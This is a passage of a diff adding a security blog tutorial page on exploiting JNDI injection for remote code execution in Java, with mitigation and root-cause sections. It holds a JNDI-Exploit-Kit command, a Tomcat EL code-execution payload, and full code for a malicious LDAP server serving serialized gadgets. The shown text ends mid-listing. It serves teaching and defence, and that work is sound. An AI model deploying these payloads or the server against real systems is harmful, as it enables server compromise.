@@ -1,0 +1,771 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>JNDI to RCE | zdaylabs</title>
+  <link rel="icon" href="data:image/svg+xml,%3Csvg xmlns=%27http://www.w3.org/2000/svg%27 viewBox=%270 0 32 32%27%3E%3Crect width=%2732%27 height=%2732%27 rx=%277%27 fill=%27%237c9cff%27/%3E%3Ctext x=%2716%27 y=%2723%27 font-size=%2720%27 font-weight=%27800%27 text-anchor=%27middle%27 fill=%27%23090b10%27 font-family=%27sans-serif%27%3EZ%3C/text%3E%3C/svg%3E">
+  <link rel="stylesheet" href="style.css">
+  <meta name="theme-color" content="#090b10">
+</head>
+<body>
+  <a class="skip-link" href="#main">Skip to content</a>
+<header class="site-header">
+  <div class="header-inner">
+    <a class="brand" href="index.html" aria-label="ZDaylabs home"><span class="brand-mark" aria-hidden="true">Z</span>ZDaylabs</a>
+    <button class="nav-toggle" type="button" aria-expanded="false" aria-controls="site-nav" aria-label="Toggle navigation"><span></span></button>
+    <nav class="site-nav" id="site-nav" aria-label="Primary">
+      <a href="index.html">Home</a>
+      <a href="blogs.html">Blogs</a>
+      <a href="research.html">Research</a>
+      <a href="policy.html">Disclosure</a>
+      <a href="contact.html">Contact</a>
+      <span class="nav-social">
+        <a href="https://www.linkedin.com/in/swagatkumar/" target="_blank" rel="noopener noreferrer">LinkedIn</a>
+        <a href="https://x.com/webspl01t3r" target="_blank" rel="noopener noreferrer">X</a>
+      </span>
+    </nav>
+  </div>
+</header>
+
+
+  <main id="main" class="article">
+        <h1>JNDI Injection To Remote Code Execution.</h1>
+        <p>
+            <br />
+        </p>
+        <p>In this blog post we will talk about&nbsp;</p>
+        <p></p>
+        <ul style="text-align: left;">
+            <li>What is JNDI Injection</li>
+            <li>Vulnerable Code Signature</li>
+            <li>Exploitation</li>
+            <ul>
+                <li>Before JAVA 8u121</li>
+                <li>After Java 8u121</li>
+            </ul>
+            <li>Mitigation</li>
+            <li>Root Cause Analysis</li>
+            <li>Building your Own Malicious LDAP Server</li>
+            <li>Modifying Existing Tools</li>
+                <li>Beyond Java 8</li>
+                <ul>
+                    <li>Effectivness of Exploit on JDK Versions</li>
+                    <li>Restrictions from JDK 20 To 22</li>
+                </ul>
+            </li>
+        </ul>
+        <h3 style="text-align: left;">What is JNDI Injection:</h3>
+        <div>JNDI stands for Java Naming Directory.</div>
+        <div>This is used on Java apps for various purposes which most of time includes to either search for something on ldap or the Corporate Active Directory.</div>
+        <div>
+            <br />
+        </div>
+        <div>So lets say you have an application where you want the user to be able to login with the corporate AD Creds.</div>
+        <div>
+            <br />
+        </div>
+        <div>So to achieve this you have to integrate your enterprise JAVA application with your Corporate Active Directory or you can set it up with an LDAP server either used by the same Active direcotory or some other ldap server that you controll which have the
+            user identity with it.</div>
+        <div>
+            <br />
+        </div>
+        <div>Now to achieve this you have to use the Java Naming Directory Libraries or the below list of packages</div>
+        <div>
+            <ul style="text-align: left;">
+                <li>import javax.naming.InitialContext;</li>
+                <li>import javax.naming.Context;</li>
+                <li>import javax.naming.NamingEnumeration;</li>
+                <li>import javax.naming.NamingException;</li>
+                <li>import javax.naming.directory.*;</li>
+            </ul>
+            <h3 style="text-align: left;">Vulnerable Code Signature:</h3></div>
+        <div>Before looking at the vulnerable code , lets look at how the actual use case code looks like.</div>
+        <div>Now there 2 things primarily gets done by the JNDI.</div>
+        <div>
+            <ul style="text-align: left;">
+                <li>Search for the entity</li>
+                <li>Look Up&nbsp;</li>
+            </ul>
+            <div>So on the first instance where you want to check if the user exist on the Ldap server or not, you will perform a search operation.</div>
+        </div>
+        <div>
+            <br />
+        </div>
+        <p><img src="images/jndiInjection/jndisearch.PNG"></p>
+        <div>Similarly, lets say you have an application which takes and ldap server configuration , there the operation that primarily going to happen is a Ldap Look Up.</div>
+        <div>
+            <br />
+        </div>
+        <div>But why an application will take ldap server as input?</div>
+        <div>
+            <br />
+        </div>
+        <div>Well there are many reasons but lets take the below scenario into account .</div>
+        <div>
+            <br />
+        </div>
+        <div>Lets say you have an application which allows you to use your ldap server for authentication,</div>
+        <div>Now in order to do that the application first needs to take the ldap servicer configuration and perform a look up and once the lookup is successful then the rest of the process continues.</div>
+        <div>
+            <br />
+        </div>
+        <div>Below is the sample code for the ldap lookup(or we can say a JNDI lookup)</div>
+        <div>
+            <p><img src="images/jndiInjection/jndilookup.PNG"></p>
+        <div>Now both the above code is vulnerable to JNDI Injection.</div>
+        <h3 style="text-align: left;">Exploitation:</h3>
+        <div>The exploitation for both the sitatuion is same.</div>
+        <div>
+            <br />
+        </div>
+        <h4 style="text-align: left;">For lookup():</h4>
+        <div>if we can control the input for the ctx.lookup() then we can acieve JNDI injection and eventually a Remote Code Execution/</div>
+        <h4 style="text-align: left;">For Search():</h4>
+        <div>For a successful exploitation of the search() we need to have the seach attribute in controll plus setReturningObjectFlag of the searchControl class needs to be true.</div>
+        <div>if you see the above , you will notice that on the ctx.search() we are sending an object of the searchControll class.</div>
+        <div>
+            <br />
+        </div>
+        <div>This class has an attribute called setReturningObjectFlag().</div>
+        <div>
+            <br />
+        </div>
+        <div>The setReturningObjFlag method of the SearchControls class in Java's JNDI API controls whether or not the search results include the objects bound to the names found in the directory. When using the javax.naming.directory package to perform searches in
+            a directory, you can configure SearchControls to dictate how the search should be conducted. This includes the scope of the search, which attributes to return, and whether the actual objects associated with the directory entries should be returned.</div>
+        <div>
+            <br />
+        </div>
+        <div>So if this flag's value is set to True and the LDAP server returns a serialized Object then the JNDI api is going to deserialize the object resulting in potential remote code execution</div>
+        <div>
+            <br />
+        </div>
+        <div>To exploit this vulnerability we have to host a ldap server which can return a malicious Object which upon deserlisation can get us a code exuection.</div>
+        <div>
+            <br />
+        </div>
+        <div>Now The exploitation differs slightly from JDK version to version:</div>
+        <div>
+            <br />
+        </div>
+        <h4 style="text-align: left;">On JDK &lt;=8u121:</h4>
+        <div>On JDK &lt;=8u121 the we can send serialized data in such a way that the JNDI loads a class from a remote server and execute it.</div>
+        <div>
+            <br />
+        </div>
+        <div>This happens due to the fact that on JDK code before the specified version at</div>
+        <div>
+            <br />
+        </div>
+        <div>com/sun/jndi/ldap/VersionHelper.java#55 sets the value of the&nbsp;com.sun.jndi.ldap.object.trustURLCodebase property to True.</div>
+            <div>In higher version of jdk this property's default value is set to false but if your application explicitly set it to true then on higher vesions of jdk you can load a remote class as well.</div>
+        <div>
+            <br />
+        </div>
+        <div>Hence on <b><i>JDK &lt;=8u121</i></b> you can directly load a remote class over LDAP or RMI</div>
+        <div>
+            <br />
+        </div>
+        <div>
+            <br />
+        </div>
+        <div>
+            <h4>On JDK &gt;=8u121:</h4></div>
+        <div>
+            <br />
+        </div>
+        <div>Since on these version the value of the com.sun.jndi.ldap.object.trustURLCodebase property is set to false you can not load a malicious class from a remote server and achieve RCE.</div>
+        <div>
+            <br />
+        </div>
+        <div>But to test if the vulnerability exist or not you can still get DNS pings backs.</div>
+        <div>
+            <br />
+        </div>
+        <div>In order to get a Full RCE on these version you have to use the gadgets present on the Class Path.</div>
+        <div>
+            <br />
+        </div>
+        <br />
+        <br />
+        <div>To Understand it better lets use a vulnerable application, set up our own malicious ldap server and try to exploit the vulnerability.</div>
+        <div>
+            <br />
+        </div>
+        </div>
+        
+        <div>You can get the VulnerableApplication from <a href="https://github.com/w3bspl01t3r/VulnerableApps">Here</a></div>
+        <div>
+            <br />
+        </div>
+        <div>We will use <a href="https://github.com/pimps/JNDI-Exploit-Kit/tree/master">JNDI-Exploit-Kit</a> as the malicious LDAP Server</div>
+        <div>
+        <P><h4><i><b>we will first exploit it on JDK 8u121</b></i></h4></P>
+        <p>
+            you can first compile the app with JDK 8u121 by downloading the jdk8u121 from Oracle site and putting it in the class path.
+        </p>
+        <p>
+        
+            Now lets download the JNDI-Exploit-Kit
+        
+        </p>
+        <p>Lets Compile the JNDI Exploit Kit and start our malicious JNDI server</p>
+        <p>mvn clean package</p>
+        <p>java -jar JNDI-Exploit-Kit-1.0-SNAPSHOT-all.jar  -C "curl http://localhost:9001/ExploitWith8u121Success"</p>
+        <p>The above will generate some ldap and rmi urls, pick the right url and feed it to the app.</p>
+        <p>You will see that we got a http call back to our server as shown on the below image</p>
+        <p><img src="images/jndiInjection/jndilookupExploit8u121.PNG"></p>
+        </div>
+        
+        <div><p><h4><i><b>we will now exploit it on JDK version higher than 8u121</b></i></h4></p>
+        
+            <p>Key point here is that we need to have to have a gadget on the class path to Get Full fledge RCE on JDK version
+                higher than 8u121+ and 8u191+
+            </p>
+            <p>
+                So we will take 2 cases 
+            </p>
+            <p>
+                <ul>
+                    <li>With 1 of the gadget Such as commonsCollections present on the class Path</li>
+                    <li>No gadget of ysoserial present but the app is deployed on tomcat</li>
+                </ul>
+            </p>
+            <br />
+            <br />
+            <p>Lets change the Ldap URL as follows</p>
+            <p><img src="images/jndiInjection/lookupExampleWIthCommonsCollections6.PNG"></p>
+            <p>Lets try the same above methods but this time we will compile the code by passing CommonsCollection3.2.1 on the class path
+         </p>
+         <p>javac -cp commons-collections-3.2.1.jar:. jntest.java</p>
+         <p>java -cp commons-collections-3.2.1.jar:. jntest</p>
+        
+         <p> you will see ,this time the operations on the ldap server is different.</p>
+         <p>instead of pointing to the remote class the ldap server has returned a serialised data which is for CommonsCollections6 gadget</p>
+         <P>and we have successfully exploited the vulnerablity</P>
+         <p><img src="images/jndiInjection/SuccessFulexploitWithGadget.PNG"></p>
+        </div>
+        <h3>Using Tomcat WebServer</h3>
+        <p> Now the way we exploit the vulnerablity in a tomcat server is by utilising a gadget present on the tomcat class Path</p>
+        <p>The gadget is tomcat version specific.THe last version i check where it was working was tomcat 8.5.75</p>
+        <p>To understand what this gadget is, lets take a look into the Malicous LDap Code(we will see how to build you own later in this blog post)
+            <p>The gadget uses the org.apache.naming.factory.BeanFactory class along with javax.el.ELProcessor to send our malicous payload i.e 
+                <div style="background-color: #0d1117; color: #bcbec4;"><pre style="font-family: 'JetBrains Mono',monospace; font-size: 9.8pt;"><span style="color: #cf8e6d;">String</span> payload = (<span style="color: #6aab73;">"{"</span> +
+        <span style="color: #6aab73;">"\"\".getClass().forName(\"javax.script.ScriptEngineManager\")"</span> +
+        <span style="color: #6aab73;">".newInstance().getEngineByName(\"JavaScript\")"</span> +
+        <span style="color: #6aab73;">".eval(\"java.lang.Runtime.getRuntime().exec(${command})\")"</span> +
+        <span style="color: #6aab73;">"}"</span>)
+        .<span style="color: #56a8f5;">replace</span>(<span style="color: #6aab73;">"${command}"</span>, <span style="color: #56a8f5;">makeJavaScriptString</span>(<span style="color: #cf8e6d;">Config</span>.command));</pre></div>
+                    <p>Now why does this particular class is used is out side the scope of this blog </p>
+                    <p>Checkout <a href="https://www.veracode.com/blog/research/exploiting-jndi-injections-java">Exploiting JNDI Injection In Java Veracode</a> To learn about it.</p>
+            </i></p>
+        <p>So If the tomcat server uses the tomcat server with the below version then the above gadget can be used to get code execution</p>
+        <p>
+            <div style="background-color: #0d1117; color: #bcbec4;"><pre style="font-family: 'JetBrains Mono',monospace; font-size: 9.8pt;"><span style="color: #bcbec4;">8.5.x for 8.5.79 onwards
+9.0.x for 9.0.63 onwards
+10.0.x for 10.0.21 onwards
+10.1.x for 10.1.0-M14 onwards</span></pre></div>
+        </p>
+        <p>So lets change our code to use the tomcat gadget</p>
+
+        <video width="900" controls><source src="videos/jnditomcatrce.mp4" type="video/mp4"></video>
+        <div>
+            <br />
+        </div>
+        <div>
+            <br />
+        </div>
+        
+
+
+        <h3 style="text-align: left;">Mitigation:</h3>
+        <h4>For lookup():</h4>
+        <div>The vulnerability here lies on the Custom App written by the developer which passes the user controlled data to the initialContext.Lookup().</div>
+        <div>
+            <br />
+        </div>
+        <div>The url passed to the initialContext.Lookup() should not be user controlled,</div>
+        <div>
+            <br />
+        </div>
+        <h4 style="text-align: left;">For search():</h4>
+        <div>The default value of SearchControls.setReturningObjFlag () is set to False.</div>
+        <div>So unless the flag is explicitly set to True , the search() is not vulnerable and can be used as it is.</div>
+        <h3 style="text-align: left;">Root Cause Analysis:</h3>
+        <p>So to analyse the Root cause the best way is to use a debugger and an ide</p>
+        <p>So after debugging the entire flow with vulnerable exploitation we found the follwoing code flow.</p>
+       
+       <h3>For Remote Class Loading</h3>
+       <p>
+        <div style="background-color: #0d1117; color: #bcbec4;"><pre style="font-family: 'JetBrains Mono',monospace; font-size: 9.8pt;"><span style="color: #cf8e6d;">org.struts2Test.jndiTestAction</span>.<span style="color: #56a8f5;">execute</span>
+    <span style="color: #cf8e6d;">javax.naming.InitialContext</span>.<span style="color: #56a8f5;">lookup</span>(<span style="color: #b3ae60;">409</span>)
+        <span style="color: #cf8e6d;">com.sun.jndi.url.ldap.ldapURLContext</span>.<span style="color: #56a8f5;">lookup</span>(ldapURLContext.java:<span style="color: #b3ae60;">94</span>)
+            <span style="color: #cf8e6d;">com.sun.jndi.toolkit.url.GenericURLContext</span>.<span style="color: #56a8f5;">lookup</span>(GenericURLContext.java:<span style="color: #b3ae60;">220</span>)
+                <span style="color: #cf8e6d;">com.sun.jndi.toolkit.ctx.PartialCompositeContext</span>.<span style="color: #56a8f5;">lookup</span>(PartialCompositeContext.java:<span style="color: #b3ae60;">177</span>)
+                    <span style="color: #cf8e6d;">com.sun.jndi.toolkit.ctx.ComponentContext</span>.<span style="color: #56a8f5;">p_lookup</span>(ComponentContext.java:<span style="color: #b3ae60;">542</span>)
+                        <span style="color: #cf8e6d;">com.sun.jndi.ldap.LdapCtx</span>.<span style="color: #56a8f5;">c_lookup</span>(LdapCtx.java:<span style="color: #b3ae60;">1115</span>)
+                            <span style="color: #cf8e6d;">com.sun.naming.internal</span>.<span style="color: #56a8f5;">getDirObjectInstance</span>(NamingManagerHelper.java:<span style="color: #b3ae60;">105</span>)
+                                <span style="color: #cf8e6d;">com.sun.naming.internal</span>.<span style="color: #56a8f5;">getObjectFactoryFromReference</span>(NamingManagerHelper.java:<span style="color: #b3ae60;">206</span>)
+                                    <span style="color: #cf8e6d;">com.sun.naming.internal.VersionHelper</span>.<span style="color: #56a8f5;">loadclass</span>(VersionHelper.java:<span style="color: #b3ae60;">110</span>)</pre></div>
+    </p>
+       <h3>For exploit using 3rd party gadgets</h3>
+        <p>
+            <div style="background-color: #0d1117; color: #bcbec4;"><pre style="font-family: 'JetBrains Mono',monospace; font-size: 9.8pt;"><span style="color: #cf8e6d;">org.struts2Test.jndiTestAction</span>.<span style="color: #56a8f5;">execute</span>
+    <span style="color: #cf8e6d;">javax.naming.InitialContext</span>.<span style="color: #56a8f5;">lookup</span>(<span style="color: #b3ae60;">409</span>)
+        <span style="color: #cf8e6d;">com.sun.jndi.url.ldap.ldapURLContext</span>.<span style="color: #56a8f5;">lookup</span>(ldapURLContext.java:<span style="color: #b3ae60;">94</span>)
+            <span style="color: #cf8e6d;">com.sun.jndi.toolkit.url.GenericURLContext</span>.<span style="color: #56a8f5;">lookup</span>(GenericURLContext.java:<span style="color: #b3ae60;">220</span>)
+                <span style="color: #cf8e6d;">com.sun.jndi.toolkit.ctx.PartialCompositeContext</span>.<span style="color: #56a8f5;">lookup</span>(PartialCompositeContext.java:<span style="color: #b3ae60;">177</span>)
+                    <span style="color: #cf8e6d;">com.sun.jndi.toolkit.ctx.ComponentContext</span>.<span style="color: #56a8f5;">p_lookup</span>(ComponentContext.java:<span style="color: #b3ae60;">542</span>)
+                        <span style="color: #cf8e6d;">com.sun.jndi.ldap.LdapCtx</span>.<span style="color: #56a8f5;">c_lookup</span>(LdapCtx.java:<span style="color: #b3ae60;">1081</span>)
+                            <span style="color: #cf8e6d;">com.sun.jndi.ldap.Obj</span>.<span style="color: #56a8f5;">decodeObject</span>(Obj.java:<span style="color: #b3ae60;">240</span>)
+                                <span style="color: #cf8e6d;">com.sun.jndi.ldap.Obj</span>.<span style="color: #56a8f5;">deserializeObject</span>(Obj.java:<span style="color: #b3ae60;">532</span>)
+                                    <span style="color: #cf8e6d;">com.sun.jndi.ldap.Obj</span>.<span style="color: #56a8f5;">deserializeObject</span>(Obj.java:<span style="color: #b3ae60;">532</span>)</pre></div>
+        </p>
+        <div>
+            Now lets answer few of our questions via this code flow.
+            <ol>
+                <li>Why above JDK 8u121 the Remote Class loading is not possible</li>
+                <li>How does the third party gadget exploits are working and till which versions of JDK and why</li>
+            </ol>
+            <p>So to answer the first question we have to anayluse the first flow.</p>
+            
+            <p>The code flow changes from the LdapCtx.java as shown Above.</p>
+            <p>If you check the last sink fucntion you will see there is conditional check if we can TRUST_URL_CODE_BASE</p>
+            <p><img src="images/jndiInjection/trusturlcodebasecheck.PNG"></p>
+            <p>tracing the variable back</p>
+            <p><img src="images/jndiInjection/trusturlcodebasedefaultvalue.PNG"></p>
+            <p>As you can see the default value is set to false and if the value is set to false , the condition is failed and we can not trust the Code base and from the loadclass() returns null</p>
+            <p>Hence we can not exploit this vulnerability on JDK higher than 8u121 as till 8u121 the value of the com.sun.jndi.ldap.object.trustURLCodebase was true by default.</p>
+            <p> So if the target application is using JDK higher than 8u121 but explicitly setting this property to true then we can still load the remote class and achieve RCE Via this way.</p>
+            
+            <p>Lets answer the 2nd question now</p>
+            <p>Now if you analyse the 2nd flow's 2nd last sink function() i.e decodeObject() Obj.java(227), you will see the function is calling deserializeObject() with a classLoader and some attributes.</p>
+            <p><img src="images/jndiInjection/decodeObjectCallingDesr.PNG"></p>
+            <p>These attributes are the attribute that we will be sending from our Ldap server and the get() just makes sure that only the value is being passed to the function</p>
+            <p>Now deserializeObject() eventually passes this byte array to ObjectInputStream or LoaderInputStream(which any way sends it back to ObjectInputStream using inheritance) and calls the readObject() on it.</p>
+            <p><img src="images/jndiInjection/readObjectCall.PNG"></p>
+            <p>As you are well aware this is a classic java Deserialisation attack scenario</p>
+            <p>Hence we are able to send serialised gadget chain of the 3rd party libraries and achieve RCE Via this.</p>
+
+            <p>Then why this is not working after JDK 19.</p>
+            <p>Play close attention to decodeObject() line 236</p>
+            <p><img src="images/jndiInjection/desrcheck.PNG"></p>
+            <p>As you can see it checks if isSerialData is allowed</p>
+            <p>Examining the function at VersionHelper and backtracking as we did above for the Remote Class loading we see the below</p>
+            <p>
+                <img src="images/jndiInjection/isserallowed.PNG">
+            </p>
+            <p><img src="images/jndiInjection/defaultserial.PNG"></p>
+            <p>So since the default value of com.sun.jndi.ldap.object.trustSerialData is set to false and based on this Value the check at decodeObject() either moves to deserializeObject() or throws an error, we are not able to exploit this on JDK above 19.</p>
+            <p>So if the application is explicitly setting this property value to be True then we can again exploit it even on JDK 22 which is the latest JDK Released at the time of writing.</p>
+        </div>
+
+
+
+
+
+
+
+
+
+
+
+
+
+        <h3 style="text-align: left;">Building your Own Malicious LDAP Server</h3>
+        <i><b>Note:</b>In real life exploitation you may not find any of the ysoserial gadget working.
+        <br>At that time you need to have  a custom gadget and should be able to integrate that gadget with your own malicous server or existing tools.
+    <br>So learning how to build your own Malicious server can  help you with both the cases.</i>
+        <div><p>The Ldap server can be built for 2 purpose</p>
+        <ul><li>For remote class loading</li>
+        <li>For sending serialized Data that uses Gadgets present in the class path to Acived RCE</li></ul></div>
+        <div><h4>For sending serialized Data that uses Gadgets present in the class path to Acived RCE</h4></div>
+        <p>So lets breka the malicious ldap server into below steps</p>
+        <p>We will be using <a href="https://mvnrepository.com/artifact/com.unboundid/unboundid-ldapsdk/7.0.0"> UnboundID LDAP SDK</a></p>
+        <p>
+            <ol>
+                <li>Configure the  in-memory LDAP Serverr</li>
+                <div style="background-color: #0d1117; color: #bcbec4;"><pre style="font-family: 'JetBrains Mono',monospace; font-size: 9.8pt;"><span style="color: #cf8e6d;">public class</span> ldaptest {
+
+    <span style="color: #808080;">//Setting up the configuration for the malicious LDAP Server</span>
+    <span style="color: #cf8e6d;">InMemoryDirectoryServerConfig</span> <span style="color: #56a8f5;">serverConfiguration</span>() <span style="color: #cf8e6d;">throws</span> <span style="color: #cf8e6d;">LDAPException</span> {
+        <span style="color: #cf8e6d;">InMemoryDirectoryServerConfig</span> config = <span style="color: #cf8e6d;">new</span> <span style="color: #cf8e6d;">InMemoryDirectoryServerConfig</span>(<span style="color: #6aab73;">"random=test"</span>);
+        <span style="color: #cf8e6d;">InMemoryListenerConfig</span> listenerConfig = <span style="color: #cf8e6d;">InMemoryListenerConfig</span>.<span style="color: #56a8f5;">createLDAPConfig</span>(<span style="color: #6aab73;">"default"</span>, <span style="color: #b3ae60;">1389</span>);
+        config.<span style="color: #56a8f5;">setListenerConfigs</span>(listenerConfig);
+        <span style="color: #cf8e6d;">return</span> config;
+    }
+}</pre></div>
+                <li>Add entries that returns serialized data for a particular search</li>
+                <div style="background-color: #0d1117; color: #bcbec4;"><pre style="font-family: 'JetBrains Mono',monospace; font-size: 9.8pt;"><span style="color: #808080;">//Creating Malicous Entries TO send Serilised Data</span>
+<span style="color: #cf8e6d;">InMemoryDirectoryServerConfig</span> <span style="color: #56a8f5;">malicousServerEntryAndResponse</span>(<span style="color: #cf8e6d;">byte</span>[] decodedBytes) <span style="color: #cf8e6d;">throws</span> <span style="color: #cf8e6d;">LDAPException</span> {
+    <span style="color: #cf8e6d;">InMemoryDirectoryServerConfig</span> config = <span style="color: #56a8f5;">serverConfiguration</span>();
+
+    <span style="color: #808080;">//Intercepting the Call and sending Malicious Response</span>
+    config.<span style="color: #56a8f5;">addInMemoryOperationInterceptor</span>(<span style="color: #cf8e6d;">new</span> <span style="color: #cf8e6d;">InMemoryOperationInterceptor</span>() {
+        <span style="color: #b3ae60;">@Override</span>
+        <span style="color: #cf8e6d;">public void</span> <span style="color: #56a8f5;">processSearchResult</span>(<span style="color: #cf8e6d;">InMemoryInterceptedSearchResult</span> result) {
+            <span style="color: #cf8e6d;">ReadOnlySearchRequest</span> request = result.<span style="color: #56a8f5;">getRequest</span>();
+            <span style="color: #cf8e6d;">if</span> (request.<span style="color: #56a8f5;">getBaseDN</span>().<span style="color: #56a8f5;">toString</span>().<span style="color: #56a8f5;">equalsIgnoreCase</span>(<span style="color: #6aab73;">"o=custom"</span>)) {
+                <span style="color: #cf8e6d;">System</span>.out.<span style="color: #56a8f5;">println</span>(<span style="color: #6aab73;">"Inside Malicious EntryFunction() on custom thing"</span>);
+                <span style="color: #cf8e6d;">Entry</span> entry = <span style="color: #cf8e6d;">new</span> <span style="color: #cf8e6d;">Entry</span>(<span style="color: #6aab73;">"o=custom"</span>);
+                entry.<span style="color: #56a8f5;">addAttribute</span>(<span style="color: #6aab73;">"javaClassName"</span>, <span style="color: #6aab73;">"java.lang.String"</span>);
+                entry.<span style="color: #56a8f5;">addAttribute</span>(<span style="color: #6aab73;">"javaSerializedData"</span>, decodedBytes);
+                <span style="color: #cf8e6d;">System</span>.out.<span style="color: #56a8f5;">println</span>(<span style="color: #6aab73;">"service Response"</span>);
+                <span style="color: #cf8e6d;">try</span> {
+                    result.<span style="color: #56a8f5;">sendSearchEntry</span>(entry);
+                    result.<span style="color: #56a8f5;">setResult</span>(<span style="color: #cf8e6d;">new</span> <span style="color: #cf8e6d;">LDAPResult</span>(<span style="color: #b3ae60;">0</span>, <span style="color: #cf8e6d;">ResultCode</span>.SUCCESS));
+                } <span style="color: #cf8e6d;">catch</span> (<span style="color: #cf8e6d;">LDAPException</span> e) {
+                    e.<span style="color: #56a8f5;">printStackTrace</span>();
+                }
+            } <span style="color: #cf8e6d;">else</span> {
+                result.<span style="color: #56a8f5;">setResult</span>(<span style="color: #cf8e6d;">new</span> <span style="color: #cf8e6d;">LDAPResult</span>(<span style="color: #b3ae60;">0</span>, <span style="color: #cf8e6d;">ResultCode</span>.NO_SUCH_OBJECT));
+            }
+        }
+    });
+
+    <span style="color: #cf8e6d;">return</span> config;
+}</pre></div>
+                </code>
+                <li>Start the ldap server</li>
+<div style="background-color: #0d1117; color: #bcbec4;"><pre style="font-family: 'JetBrains Mono',monospace; font-size: 9.8pt;"><span style="color: #808080;">//Main Method</span>
+<span style="color: #cf8e6d;">public static void</span> <span style="color: #56a8f5;">main</span>(<span style="color: #cf8e6d;">String</span>[] args) {
+    <span style="color: #cf8e6d;">try</span> {
+        <span style="color: #808080;">//Ysoserial Payload</span>
+        <span style="color: #cf8e6d;">String</span> ser_data = <span style="color: #6aab73;">"base64 encoded Serilised Gadget Data"</span>;
+        <span style="color: #cf8e6d;">byte</span>[] decodedBytes = <span style="color: #cf8e6d;">Base64</span>.<span style="color: #56a8f5;">getDecoder</span>().<span style="color: #56a8f5;">decode</span>(ser_data);
+
+        ldaptest obj = <span style="color: #cf8e6d;">new</span> <span style="color: #56a8f5;">ldaptest</span>();
+
+        <span style="color: #808080;">//Starts the LDAP Server</span>
+        <span style="color: #cf8e6d;">InMemoryDirectoryServer</span> ds = <span style="color: #cf8e6d;">new</span> <span style="color: #cf8e6d;">InMemoryDirectoryServer</span>(obj.<span style="color: #56a8f5;">malicousServerEntryAndResponse</span>(decodedBytes));
+        ds.<span style="color: #56a8f5;">startListening</span>();
+        <span style="color: #cf8e6d;">System</span>.out.<span style="color: #56a8f5;">println</span>(<span style="color: #6aab73;">"LDAP Server started on port 1389"</span>);
+
+    } <span style="color: #cf8e6d;">catch</span> (<span style="color: #cf8e6d;">Exception</span> e) {
+        e.<span style="color: #56a8f5;">printStackTrace</span>();
+    }
+}</pre></div>
+                <div><p>
+                    <i>Adding all the above, a sample malicious LDAP Server code should look like below</i>
+                </p>
+                <p>
+<div style="background-color: #0d1117; color: #bcbec4;"><pre style="font-family: 'JetBrains Mono',monospace; font-size: 9.8pt;"><span style="color: #cf8e6d;">import</span> java.util.Base64;
+
+<span style="color: #cf8e6d;">import</span> com.unboundid.ldap.listener.InMemoryDirectoryServer;
+<span style="color: #cf8e6d;">import</span> com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;
+<span style="color: #cf8e6d;">import</span> com.unboundid.ldap.listener.InMemoryListenerConfig;
+<span style="color: #cf8e6d;">import</span> com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
+<span style="color: #cf8e6d;">import</span> com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;
+<span style="color: #cf8e6d;">import</span> com.unboundid.ldap.sdk.*;
+
+<span style="color: #cf8e6d;">public class</span> ldaptest {
+
+    <span style="color: #808080;">//Setting up the configuration for the malicious LDAP Server</span>
+    <span style="color: #cf8e6d;">InMemoryDirectoryServerConfig</span> <span style="color: #56a8f5;">serverConfiguration</span>() <span style="color: #cf8e6d;">throws</span> <span style="color: #cf8e6d;">LDAPException</span> {
+        <span style="color: #cf8e6d;">InMemoryDirectoryServerConfig</span> config = <span style="color: #cf8e6d;">new</span> <span style="color: #cf8e6d;">InMemoryDirectoryServerConfig</span>(<span style="color: #6aab73;">"random=test"</span>);
+        <span style="color: #cf8e6d;">InMemoryListenerConfig</span> listenerConfig = <span style="color: #cf8e6d;">InMemoryListenerConfig</span>.<span style="color: #56a8f5;">createLDAPConfig</span>(<span style="color: #6aab73;">"default"</span>, <span style="color: #b3ae60;">1389</span>);
+        config.<span style="color: #56a8f5;">setListenerConfigs</span>(listenerConfig);
+        <span style="color: #cf8e6d;">return</span> config;
+    }
+
+    <span style="color: #808080;">//Creating Malicious Entries TO send Serialised Data</span>
+    <span style="color: #cf8e6d;">InMemoryDirectoryServerConfig</span> <span style="color: #56a8f5;">malicousServerEntryAndResponse</span>(<span style="color: #cf8e6d;">byte</span>[] decodedBytes) <span style="color: #cf8e6d;">throws</span> <span style="color: #cf8e6d;">LDAPException</span> {
+        <span style="color: #cf8e6d;">InMemoryDirectoryServerConfig</span> config = <span style="color: #56a8f5;">serverConfiguration</span>();
+
+        <span style="color: #808080;">//Intercepting the Call and sending Malicious Response</span>
+        config.<span style="color: #56a8f5;">addInMemoryOperationInterceptor</span>(<span style="color: #cf8e6d;">new</span> <span style="color: #cf8e6d;">InMemoryOperationInterceptor</span>() {
+            <span style="color: #b3ae60;">@Override</span>
+            <span style="color: #cf8e6d;">public void</span> <span style="color: #56a8f5;">processSearchResult</span>(<span style="color: #cf8e6d;">InMemoryInterceptedSearchResult</span> result) {
+                <span style="color: #cf8e6d;">ReadOnlySearchRequest</span> request = result.<span style="color: #56a8f5;">getRequest</span>();
+                <span style="color: #cf8e6d;">if</span> (request.<span style="color: #56a8f5;">getBaseDN</span>().<span style="color: #56a8f5;">toString</span>().<span style="color: #56a8f5;">equalsIgnoreCase</span>(<span style="color: #6aab73;">"o=custom"</span>)) {</pre></div>
+                    System.out.println("Inside Malicious EntryFucntion() on custome thing");
+                    Entry entry = new Entry("o=custom");
+                    entry.addAttribute("javaClassName", "java.lang.String");
+                    entry.addAttribute("javaSerializedData", decodedBytes);
+                    System.out.println("service Response");
+                    try {
+                        result.sendSearchEntry(entry);
+                        result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
+                    } catch (LDAPException e) {
+                        e.printStackTrace();
+                    }
+                } else {
+                    result.setResult(new LDAPResult(0, ResultCode.NO_SUCH_OBJECT));
+                }
+            }
+        });
+
+
+        return config;
+    }
+
+    <span style="color: #808080;">//Main Method</span>
+    <span style="color: #cf8e6d;">public</span> <span style="color: #cf8e6d;">static</span> <span style="color: #cf8e6d;">void</span> <span style="color: #56a8f5;">main</span>(<span style="color: #cf8e6d;">String</span>[] args) {
+        <span style="color: #cf8e6d;">try</span> {
+            <span style="color: #808080;">//Ysoserial Payload</span>
+            <span style="color: #cf8e6d;">String</span> ser_data = <span style="color: #6aab73;">"base64 encoded Serilised Gadget Data"</span>;
+           
